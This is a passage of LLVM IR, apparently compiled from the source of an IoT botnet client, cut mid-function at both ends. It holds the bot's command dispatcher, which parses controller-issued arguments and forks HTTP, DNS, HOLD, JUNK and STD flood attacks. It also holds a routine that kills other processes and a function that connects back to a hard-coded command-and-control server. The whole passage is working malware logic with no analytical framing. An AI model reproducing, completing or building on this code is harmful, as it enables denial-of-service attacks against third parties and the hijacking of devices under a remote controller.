  call void @sendHTTP(i8* %522, i8* %525, i16 zeroext %530, i8* %533, i32 %537, i32 %541)
  call void @_exit(i32 0) #12
  unreachable

; <label>:542:                                    ; preds = %516
  %543 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %543, i8** %27, align 8
  br label %513

; <label>:544:                                    ; preds = %513
  br label %572

; <label>:545:                                    ; preds = %502
  %546 = call i32 @listFork()
  %547 = icmp ne i32 %546, 0
  br i1 %547, label %548, label %549

; <label>:548:                                    ; preds = %545
  br label %920

; <label>:549:                                    ; preds = %545
  %550 = load i8**, i8*** %4, align 8
  %551 = getelementptr inbounds i8*, i8** %550, i64 1
  %552 = load i8*, i8** %551, align 8
  %553 = load i8**, i8*** %4, align 8
  %554 = getelementptr inbounds i8*, i8** %553, i64 2
  %555 = load i8*, i8** %554, align 8
  %556 = load i8**, i8*** %4, align 8
  %557 = getelementptr inbounds i8*, i8** %556, i64 3
  %558 = load i8*, i8** %557, align 8
  %559 = call i32 @atoi(i8* %558) #10
  %560 = trunc i32 %559 to i16
  %561 = load i8**, i8*** %4, align 8
  %562 = getelementptr inbounds i8*, i8** %561, i64 4
  %563 = load i8*, i8** %562, align 8
  %564 = load i8**, i8*** %4, align 8
  %565 = getelementptr inbounds i8*, i8** %564, i64 5
  %566 = load i8*, i8** %565, align 8
  %567 = call i32 @atoi(i8* %566) #10
  %568 = load i8**, i8*** %4, align 8
  %569 = getelementptr inbounds i8*, i8** %568, i64 6
  %570 = load i8*, i8** %569, align 8
  %571 = call i32 @atoi(i8* %570) #10
  call void @sendHTTP(i8* %552, i8* %555, i16 zeroext %560, i8* %563, i32 %567, i32 %571)
  call void @_exit(i32 0) #12
  unreachable

; <label>:572:                                    ; preds = %544
  br label %573

; <label>:573:                                    ; preds = %572, %490
  %574 = load i8**, i8*** %4, align 8
  %575 = getelementptr inbounds i8*, i8** %574, i64 0
  %576 = load i8*, i8** %575, align 8
  %577 = call i32 @strcmp(i8* %576, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.461, i32 0, i32 0)) #10
  %578 = icmp ne i32 %577, 0
  br i1 %578, label %675, label %579

; <label>:579:                                    ; preds = %573
  %580 = call i32 @socket(i32 2, i32 3, i32 255) #2
  store i32 %580, i32* %28, align 4
  %581 = icmp slt i32 %580, 0
  br i1 %581, label %582, label %583

; <label>:582:                                    ; preds = %579
  call void @exit(i32 1) #14
  unreachable

; <label>:583:                                    ; preds = %579
  %584 = load i32, i32* %3, align 4
  %585 = icmp slt i32 %584, 6
  br i1 %585, label %586, label %589

; <label>:586:                                    ; preds = %583
  %587 = load i32, i32* @mainCommSock, align 4
  %588 = call i32 (i32, i8*, ...) @sockprintf(i32 %587, i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.462, i32 0, i32 0))
  call void @exit(i32 0) #14
  unreachable

; <label>:589:                                    ; preds = %583
  %590 = call i32 @listFork()
  %591 = icmp ne i32 %590, 0
  br i1 %591, label %674, label %592

; <label>:592:                                    ; preds = %589
  %593 = call i64 @time(i64* null) #2
  %594 = trunc i64 %593 to i32
  call void @srand(i32 %594) #2
  %595 = load i8**, i8*** %4, align 8
  %596 = getelementptr inbounds i8*, i8** %595, i64 4
  %597 = load i8*, i8** %596, align 8
  %598 = call i32 @atoi(i8* %597) #10
  store i32 %598, i32* %29, align 4
  %599 = load i8**, i8*** %4, align 8
  %600 = getelementptr inbounds i8*, i8** %599, i64 5
  %601 = load i8*, i8** %600, align 8
  %602 = call i32 @atoi(i8* %601) #10
  store i32 %602, i32* %30, align 4
  store i32 0, i32* %32, align 4
  %603 = load i8**, i8*** %4, align 8
  %604 = getelementptr inbounds i8*, i8** %603, i64 3
  %605 = load i8*, i8** %604, align 8
  %606 = call i32 @download(i8* %605, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.418, i32 0, i32 0))
  %607 = load i32, i32* @mainCommSock, align 4
  %608 = load i8**, i8*** %4, align 8
  %609 = getelementptr inbounds i8*, i8** %608, i64 1
  %610 = load i8*, i8** %609, align 8
  %611 = load i8**, i8*** %4, align 8
  %612 = getelementptr inbounds i8*, i8** %611, i64 2
  %613 = load i8*, i8** %612, align 8
  %614 = load i8**, i8*** %4, align 8
  %615 = getelementptr inbounds i8*, i8** %614, i64 6
  %616 = load i8*, i8** %615, align 8
  %617 = call i32 @atoi(i8* %616) #10
  %618 = load i8**, i8*** %4, align 8
  %619 = getelementptr inbounds i8*, i8** %618, i64 5
  %620 = load i8*, i8** %619, align 8
  %621 = call i32 @atoi(i8* %620) #10
  %622 = call i32 (i32, i8*, ...) @sockprintf(i32 %607, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.463, i32 0, i32 0), i8* %610, i8* %613, i32 %617, i32 %621)
  %623 = load i32, i32* %29, align 4
  %624 = zext i32 %623 to i64
  %625 = call i8* @llvm.stacksave()
  store i8* %625, i8** %33, align 8
  %626 = alloca %struct.thread_data, i64 %624, align 16
  store i32 0, i32* %31, align 4
  br label %627

; <label>:627:                                    ; preds = %669, %592
  %628 = load i32, i32* %31, align 4
  %629 = load i32, i32* %29, align 4
  %630 = icmp slt i32 %628, %629
  br i1 %630, label %631, label %672

; <label>:631:                                    ; preds = %627
  %632 = load i32, i32* %31, align 4
  %633 = load i32, i32* %31, align 4
  %634 = sext i32 %633 to i64
  %635 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %626, i64 %634
  %636 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %635, i32 0, i32 0
  store i32 %632, i32* %636, align 16
  %637 = load i8**, i8*** %4, align 8
  %638 = getelementptr inbounds i8*, i8** %637, i64 1
  %639 = load i8*, i8** %638, align 8
  %640 = load i32, i32* %31, align 4
  %641 = sext i32 %640 to i64
  %642 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %626, i64 %641
  %643 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %642, i32 0, i32 1
  store i8* %639, i8** %643, align 8
  %644 = load i8**, i8*** %4, align 8
  %645 = getelementptr inbounds i8*, i8** %644, i64 2
  %646 = load i8*, i8** %645, align 8
  %647 = call i32 @atoi(i8* %646) #10
  %648 = load i32, i32* %31, align 4
  %649 = sext i32 %648 to i64
  %650 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %626, i64 %649
  %651 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %650, i32 0, i32 2
  store i32 %647, i32* %651, align 16
  %652 = load i32, i32* %32, align 4
  %653 = load i32, i32* %31, align 4
  %654 = sext i32 %653 to i64
  %655 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %626, i64 %654
  %656 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %655, i32 0, i32 3
  store i32 %652, i32* %656, align 4
  %657 = load i8**, i8*** %4, align 8
  %658 = getelementptr inbounds i8*, i8** %657, i64 6
  %659 = load i8*, i8** %658, align 8
  %660 = call i32 @atoi(i8* %659) #10
  %661 = load i32, i32* %31, align 4
  %662 = sext i32 %661 to i64
  %663 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %626, i64 %662
  %664 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %663, i32 0, i32 4
  store i32 %660, i32* %664, align 8
  %665 = load i32, i32* %31, align 4
  %666 = sext i32 %665 to i64
  %667 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %626, i64 %666
  %668 = bitcast %struct.thread_data* %667 to i8*
  call void @dnsflood(i8* %668)
  br label %669

; <label>:669:                                    ; preds = %631
  %670 = load i32, i32* %31, align 4
  %671 = add nsw i32 %670, 1
  store i32 %671, i32* %31, align 4
  br label %627

; <label>:672:                                    ; preds = %627
  %673 = load i8*, i8** %33, align 8
  call void @llvm.stackrestore(i8* %673)
  br label %674

; <label>:674:                                    ; preds = %672, %589
  br label %675

; <label>:675:                                    ; preds = %674, %573
  %676 = load i8**, i8*** %4, align 8
  %677 = getelementptr inbounds i8*, i8** %676, i64 0
  %678 = load i8*, i8** %677, align 8
  %679 = call i32 @strcmp(i8* %678, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.464, i32 0, i32 0)) #10
  %680 = icmp ne i32 %679, 0
  br i1 %680, label %741, label %681

; <label>:681:                                    ; preds = %675
  %682 = load i32, i32* %3, align 4
  %683 = icmp slt i32 %682, 4
  br i1 %683, label %696, label %684

; <label>:684:                                    ; preds = %681
  %685 = load i8**, i8*** %4, align 8
  %686 = getelementptr inbounds i8*, i8** %685, i64 2
  %687 = load i8*, i8** %686, align 8
  %688 = call i32 @atoi(i8* %687) #10
  %689 = icmp slt i32 %688, 1
  br i1 %689, label %696, label %690

; <label>:690:                                    ; preds = %684
  %691 = load i8**, i8*** %4, align 8
  %692 = getelementptr inbounds i8*, i8** %691, i64 3
  %693 = load i8*, i8** %692, align 8
  %694 = call i32 @atoi(i8* %693) #10
  %695 = icmp slt i32 %694, 1
  br i1 %695, label %696, label %699

; <label>:696:                                    ; preds = %690, %684, %681
  %697 = load i32, i32* @mainCommSock, align 4
  %698 = call i32 (i32, i8*, ...) @sockprintf(i32 %697, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.465, i32 0, i32 0))
  br label %920

; <label>:699:                                    ; preds = %690
  %700 = load i8**, i8*** %4, align 8
  %701 = getelementptr inbounds i8*, i8** %700, i64 1
  %702 = load i8*, i8** %701, align 8
  store i8* %702, i8** %34, align 8
  %703 = load i8**, i8*** %4, align 8
  %704 = getelementptr inbounds i8*, i8** %703, i64 2
  %705 = load i8*, i8** %704, align 8
  %706 = call i32 @atoi(i8* %705) #10
  store i32 %706, i32* %35, align 4
  %707 = load i8**, i8*** %4, align 8
  %708 = getelementptr inbounds i8*, i8** %707, i64 3
  %709 = load i8*, i8** %708, align 8
  %710 = call i32 @atoi(i8* %709) #10
  store i32 %710, i32* %36, align 4
  %711 = load i8*, i8** %34, align 8
  %712 = call i8* @strstr(i8* %711, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #10
  %713 = icmp ne i8* %712, null
  br i1 %713, label %714, label %732

; <label>:714:                                    ; preds = %699
  %715 = load i8*, i8** %34, align 8
  %716 = call i8* @strtok(i8* %715, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %716, i8** %37, align 8
  br label %717

; <label>:717:                                    ; preds = %729, %714
  %718 = load i8*, i8** %37, align 8
  %719 = icmp ne i8* %718, null
  br i1 %719, label %720, label %731

; <label>:720:                                    ; preds = %717
  %721 = call i32 @listFork()
  %722 = icmp ne i32 %721, 0
  br i1 %722, label %729, label %723

; <label>:723:                                    ; preds = %720
  %724 = load i8*, i8** %37, align 8
  %725 = load i32, i32* %35, align 4
  %726 = load i32, i32* %36, align 4
  call void @sendHOLD(i8* %724, i32 %725, i32 %726)
  %727 = load i32, i32* @mainCommSock, align 4
  %728 = call i32 @close(i32 %727)
  call void @_exit(i32 0) #12
  unreachable

; <label>:729:                                    ; preds = %720
  %730 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %730, i8** %37, align 8
  br label %717

; <label>:731:                                    ; preds = %717
  br label %740

; <label>:732:                                    ; preds = %699
  %733 = call i32 @listFork()
  %734 = icmp ne i32 %733, 0
  br i1 %734, label %735, label %736

; <label>:735:                                    ; preds = %732
  br label %920

; <label>:736:                                    ; preds = %732
  %737 = load i8*, i8** %34, align 8
  %738 = load i32, i32* %35, align 4
  %739 = load i32, i32* %36, align 4
  call void @sendHOLD(i8* %737, i32 %738, i32 %739)
  call void @_exit(i32 0) #12
  unreachable

; <label>:740:                                    ; preds = %731
  br label %741

; <label>:741:                                    ; preds = %740, %675
  %742 = load i8**, i8*** %4, align 8
  %743 = getelementptr inbounds i8*, i8** %742, i64 0
  %744 = load i8*, i8** %743, align 8
  %745 = call i32 @strcmp(i8* %744, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.466, i32 0, i32 0)) #10
  %746 = icmp ne i32 %745, 0
  br i1 %746, label %801, label %747

; <label>:747:                                    ; preds = %741
  %748 = load i32, i32* %3, align 4
  %749 = icmp slt i32 %748, 3
  br i1 %749, label %756, label %750

; <label>:750:                                    ; preds = %747
  %751 = load i8**, i8*** %4, align 8
  %752 = getelementptr inbounds i8*, i8** %751, i64 3
  %753 = load i8*, i8** %752, align 8
  %754 = call i32 @atoi(i8* %753) #10
  %755 = icmp slt i32 %754, 0
  br i1 %755, label %756, label %759

; <label>:756:                                    ; preds = %750, %747
  %757 = load i32, i32* @mainCommSock, align 4
  %758 = call i32 (i32, i8*, ...) @sockprintf(i32 %757, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.467, i32 0, i32 0))
  br label %920

; <label>:759:                                    ; preds = %750
  %760 = load i8**, i8*** %4, align 8
  %761 = getelementptr inbounds i8*, i8** %760, i64 1
  %762 = load i8*, i8** %761, align 8
  store i8* %762, i8** %38, align 8
  %763 = load i8**, i8*** %4, align 8
  %764 = getelementptr inbounds i8*, i8** %763, i64 2
  %765 = load i8*, i8** %764, align 8
  %766 = call i32 @atoi(i8* %765) #10
  store i32 %766, i32* %39, align 4
  %767 = load i8**, i8*** %4, align 8
  %768 = getelementptr inbounds i8*, i8** %767, i64 3
  %769 = load i8*, i8** %768, align 8
  %770 = call i32 @atoi(i8* %769) #10
  store i32 %770, i32* %40, align 4
  %771 = load i8*, i8** %38, align 8
  %772 = call i8* @strstr(i8* %771, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #10
  %773 = icmp ne i8* %772, null
  br i1 %773, label %774, label %792

; <label>:774:                                    ; preds = %759
  %775 = load i8*, i8** %38, align 8
  %776 = call i8* @strtok(i8* %775, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %776, i8** %41, align 8
  br label %777

; <label>:777:                                    ; preds = %789, %774
  %778 = load i8*, i8** %41, align 8
  %779 = icmp ne i8* %778, null
  br i1 %779, label %780, label %791

; <label>:780:                                    ; preds = %777
  %781 = call i32 @listFork()
  %782 = icmp ne i32 %781, 0
  br i1 %782, label %789, label %783

; <label>:783:                                    ; preds = %780
  %784 = load i8*, i8** %41, align 8
  %785 = load i32, i32* %39, align 4
  %786 = load i32, i32* %40, align 4
  call void @sendJUNK(i8* %784, i32 %785, i32 %786)
  %787 = load i32, i32* @mainCommSock, align 4
  %788 = call i32 @close(i32 %787)
  call void @_exit(i32 0) #12
  unreachable

; <label>:789:                                    ; preds = %780
  %790 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %790, i8** %41, align 8
  br label %777

; <label>:791:                                    ; preds = %777
  br label %800

; <label>:792:                                    ; preds = %759
  %793 = call i32 @listFork()
  %794 = icmp ne i32 %793, 0
  br i1 %794, label %795, label %796

; <label>:795:                                    ; preds = %792
  br label %920

; <label>:796:                                    ; preds = %792
  %797 = load i8*, i8** %38, align 8
  %798 = load i32, i32* %39, align 4
  %799 = load i32, i32* %40, align 4
  call void @sendJUNK(i8* %797, i32 %798, i32 %799)
  call void @_exit(i32 0) #12
  unreachable

; <label>:800:                                    ; preds = %791
  br label %801

; <label>:801:                                    ; preds = %800, %741
  %802 = load i8**, i8*** %4, align 8
  %803 = getelementptr inbounds i8*, i8** %802, i64 0
  %804 = load i8*, i8** %803, align 8
  %805 = call i32 @strcmp(i8* %804, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.468, i32 0, i32 0)) #10
  %806 = icmp ne i32 %805, 0
  br i1 %806, label %865, label %807

; <label>:807:                                    ; preds = %801
  %808 = load i32, i32* %3, align 4
  %809 = icmp slt i32 %808, 4
  br i1 %809, label %822, label %810

; <label>:810:                                    ; preds = %807
  %811 = load i8**, i8*** %4, align 8
  %812 = getelementptr inbounds i8*, i8** %811, i64 2
  %813 = load i8*, i8** %812, align 8
  %814 = call i32 @atoi(i8* %813) #10
  %815 = icmp slt i32 %814, 1
  br i1 %815, label %822, label %816

; <label>:816:                                    ; preds = %810
  %817 = load i8**, i8*** %4, align 8
  %818 = getelementptr inbounds i8*, i8** %817, i64 3
  %819 = load i8*, i8** %818, align 8
  %820 = call i32 @atoi(i8* %819) #10
  %821 = icmp slt i32 %820, 1
  br i1 %821, label %822, label %825

; <label>:822:                                    ; preds = %816, %810, %807
  %823 = load i32, i32* @mainCommSock, align 4
  %824 = call i32 (i32, i8*, ...) @sockprintf(i32 %823, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.469, i32 0, i32 0))
  br label %920

; <label>:825:                                    ; preds = %816
  %826 = load i8**, i8*** %4, align 8
  %827 = getelementptr inbounds i8*, i8** %826, i64 1
  %828 = load i8*, i8** %827, align 8
  store i8* %828, i8** %42, align 8
  %829 = load i8**, i8*** %4, align 8
  %830 = getelementptr inbounds i8*, i8** %829, i64 2
  %831 = load i8*, i8** %830, align 8
  %832 = call i32 @atoi(i8* %831) #10
  store i32 %832, i32* %43, align 4
  %833 = load i8**, i8*** %4, align 8
  %834 = getelementptr inbounds i8*, i8** %833, i64 3
  %835 = load i8*, i8** %834, align 8
  %836 = call i32 @atoi(i8* %835) #10
  store i32 %836, i32* %44, align 4
  %837 = load i8*, i8** %42, align 8
  %838 = call i8* @strstr(i8* %837, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #10
  %839 = icmp ne i8* %838, null
  br i1 %839, label %840, label %856

; <label>:840:                                    ; preds = %825
  %841 = load i8*, i8** %42, align 8
  %842 = call i8* @strtok(i8* %841, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %842, i8** %45, align 8
  br label %843

; <label>:843:                                    ; preds = %853, %840
  %844 = load i8*, i8** %45, align 8
  %845 = icmp ne i8* %844, null
  br i1 %845, label %846, label %855

; <label>:846:                                    ; preds = %843
  %847 = call i32 @listFork()
  %848 = icmp ne i32 %847, 0
  br i1 %848, label %853, label %849

; <label>:849:                                    ; preds = %846
  %850 = load i8*, i8** %45, align 8
  %851 = load i32, i32* %43, align 4
  %852 = load i32, i32* %44, align 4
  call void @sendSTD(i8* %850, i32 %851, i32 %852)
  call void @_exit(i32 0) #12
  unreachable

; <label>:853:                                    ; preds = %846
  %854 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %854, i8** %45, align 8
  br label %843

; <label>:855:                                    ; preds = %843
  br label %864

; <label>:856:                                    ; preds = %825
  %857 = call i32 @listFork()
  %858 = icmp ne i32 %857, 0
  br i1 %858, label %859, label %860

; <label>:859:                                    ; preds = %856
  br label %920

; <label>:860:                                    ; preds = %856
  %861 = load i8*, i8** %42, align 8
  %862 = load i32, i32* %43, align 4
  %863 = load i32, i32* %44, align 4
  call void @sendSTD(i8* %861, i32 %862, i32 %863)
  call void @_exit(i32 0) #12
  unreachable

; <label>:864:                                    ; preds = %855
  br label %865

; <label>:865:                                    ; preds = %864, %801
  %866 = load i8**, i8*** %4, align 8
  %867 = getelementptr inbounds i8*, i8** %866, i64 0
  %868 = load i8*, i8** %867, align 8
  %869 = call i32 @strcmp(i8* %868, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.470, i32 0, i32 0)) #10
  %870 = icmp ne i32 %869, 0
  br i1 %870, label %913, label %871

; <label>:871:                                    ; preds = %865
  store i32 0, i32* %46, align 4
  store i64 0, i64* %47, align 8
  br label %872

; <label>:872:                                    ; preds = %899, %871
  %873 = load i64, i64* %47, align 8
  %874 = load i32, i32* @numpids, align 4
  %875 = sext i32 %874 to i64
  %876 = icmp ult i64 %873, %875
  br i1 %876, label %877, label %902

; <label>:877:                                    ; preds = %872
  %878 = load i32*, i32** @pids, align 8
  %879 = load i64, i64* %47, align 8
  %880 = getelementptr inbounds i32, i32* %878, i64 %879
  %881 = load i32, i32* %880, align 4
  %882 = icmp ne i32 %881, 0
  br i1 %882, label %883, label %898

; <label>:883:                                    ; preds = %877
  %884 = load i32*, i32** @pids, align 8
  %885 = load i64, i64* %47, align 8
  %886 = getelementptr inbounds i32, i32* %884, i64 %885
  %887 = load i32, i32* %886, align 4
  %888 = call i32 @getpid() #2
  %889 = icmp ne i32 %887, %888
  br i1 %889, label %890, label %898

; <label>:890:                                    ; preds = %883
  %891 = load i32*, i32** @pids, align 8
  %892 = load i64, i64* %47, align 8
  %893 = getelementptr inbounds i32, i32* %891, i64 %892
  %894 = load i32, i32* %893, align 4
  %895 = call i32 @kill(i32 %894, i32 9) #2
  %896 = load i32, i32* %46, align 4
  %897 = add nsw i32 %896, 1
  store i32 %897, i32* %46, align 4
  br label %898

; <label>:898:                                    ; preds = %890, %883, %877
  br label %899

; <label>:899:                                    ; preds = %898
  %900 = load i64, i64* %47, align 8
  %901 = add i64 %900, 1
  store i64 %901, i64* %47, align 8
  br label %872

; <label>:902:                                    ; preds = %872
  %903 = load i32, i32* %46, align 4
  %904 = icmp sgt i32 %903, 0
  br i1 %904, label %905, label %909

; <label>:905:                                    ; preds = %902
  %906 = load i32, i32* @mainCommSock, align 4
  %907 = load i32, i32* %46, align 4
  %908 = call i32 (i32, i8*, ...) @sockprintf(i32 %906, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.471, i32 0, i32 0), i32 %907)
  br label %912

; <label>:909:                                    ; preds = %902
  %910 = load i32, i32* @mainCommSock, align 4
  %911 = call i32 (i32, i8*, ...) @sockprintf(i32 %910, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.472, i32 0, i32 0))
  br label %912

; <label>:912:                                    ; preds = %909, %905
  br label %913

; <label>:913:                                    ; preds = %912, %865
  %914 = load i8**, i8*** %4, align 8
  %915 = getelementptr inbounds i8*, i8** %914, i64 0
  %916 = load i8*, i8** %915, align 8
  %917 = call i32 @strcmp(i8* %916, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.473, i32 0, i32 0)) #10
  %918 = icmp ne i32 %917, 0
  br i1 %918, label %920, label %919

; <label>:919:                                    ; preds = %913
  call void @exit(i32 0) #14
  unreachable

; <label>:920:                                    ; preds = %913, %859, %822, %795, %756, %735, %696, %548, %499, %412, %360, %270, %205, %165, %160, %152, %137, %119, %109, %100
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #4

; Function Attrs: nounwind
declare i64 @sysconf(i32) #4

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 4096, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = icmp eq i64 %13, 1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %19

; <label>:16:                                     ; preds = %10
  %17 = load i32, i32* @currentServer, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* @currentServer, align 4
  br label %19

; <label>:19:                                     ; preds = %16, %15
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %21 = load i32, i32* @currentServer, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [1 x i8*], [1 x i8*]* @cncServer, i64 0, i64 %22
  %24 = load i8*, i8** %23, align 8
  %25 = call i8* @strcpy(i8* %20, i8* %24) #2
  store i32 23, i32* %3, align 4
  %26 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %27 = call i8* @strchr(i8* %26, i32 58) #10
  %28 = icmp ne i8* %27, null
  br i1 %28, label %29, label %36

; <label>:29:                                     ; preds = %19
  %30 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %31 = call i8* @strchr(i8* %30, i32 58) #10
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = call i32 @atoi(i8* %32) #10
  store i32 %33, i32* %3, align 4
  %34 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %35 = call i8* @strchr(i8* %34, i32 58) #10
  store i8 0, i8* %35, align 1
  br label %36

; <label>:36:                                     ; preds = %29, %19
  %37 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %37, i32* @mainCommSock, align 4
  %38 = load i32, i32* @mainCommSock, align 4
  %39 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %40 = load i32, i32* %3, align 4
  %41 = call i32 @connectTimeout(i32 %38, i8* %39, i32 %40, i32 30)
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %44, label %43

; <label>:43:                                     ; preds = %36
  store i32 1, i32* %1, align 4
  br label %45

; <label>:44:                                     ; preds = %36
  store i32 0, i32* %1, align 4
  br label %45

; <label>:45:                                     ; preds = %44, %43
  %46 = load i32, i32* %1, align 4
  ret i32 %46
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca i32, align 4
  %8 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca %struct.ifreq, align 8
  %14 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %14, i32* %2, align 4
  %15 = load i32, i32* %2, align 4
  %16 = icmp eq i32 %15, -1
  br i1 %16, label %17, label %18

; <label>:17:                                     ; preds = %0
  store i32 0, i32* %1, align 4
  br label %109

; <label>:18:                                     ; preds = %0
  %19 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 16, i32 4, i1 false)
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %20, align 4
  %21 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.474, i32 0, i32 0)) #2
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %23 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %22, i32 0, i32 0
  store i32 %21, i32* %23, align 4
  %24 = call zeroext i16 @htons(i16 zeroext 53) #13
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %24, i16* %25, align 2
  %26 = load i32, i32* %2, align 4
  %27 = bitcast %union.__CONST_SOCKADDR_ARG* %5 to %struct.sockaddr**
  %28 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %28, %struct.sockaddr** %27, align 8
  %29 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %5, i32 0, i32 0
  %30 = load %struct.sockaddr*, %struct.sockaddr** %29, align 8
  %31 = call i32 @connect(i32 %26, %struct.sockaddr* %30, i32 16)
  store i32 %31, i32* %4, align 4
  %32 = load i32, i32* %4, align 4
  %33 = icmp eq i32 %32, -1
  br i1 %33, label %34, label %35

; <label>:34:                                     ; preds = %18
  store i32 0, i32* %1, align 4
  br label %109

; <label>:35:                                     ; preds = %18
  store i32 16, i32* %7, align 4
  %36 = load i32, i32* %2, align 4
  %37 = bitcast %union.__CONST_SOCKADDR_ARG* %8 to %struct.sockaddr**
  %38 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  store %struct.sockaddr* %38, %struct.sockaddr** %37, align 8
  %39 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %8, i32 0, i32 0
  %40 = load %struct.sockaddr*, %struct.sockaddr** %39, align 8
  %41 = call i32 @getsockname(i32 %36, %struct.sockaddr* %40, i32* %7) #2
  store i32 %41, i32* %4, align 4
  %42 = load i32, i32* %4, align 4
  %43 = icmp eq i32 %42, -1
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %35
  store i32 0, i32* %1, align 4
  br label %109

; <label>:45:                                     ; preds = %35
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %47 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %46, i32 0, i32 0
  %48 = load i32, i32* %47, align 4
  store i32 %48, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %49 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.475, i32 0, i32 0), i32 0)
  store i32 %49, i32* %9, align 4
  br label %50

; <label>:50:                                     ; preds = %71, %45
  %51 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %52 = load i32, i32* %9, align 4
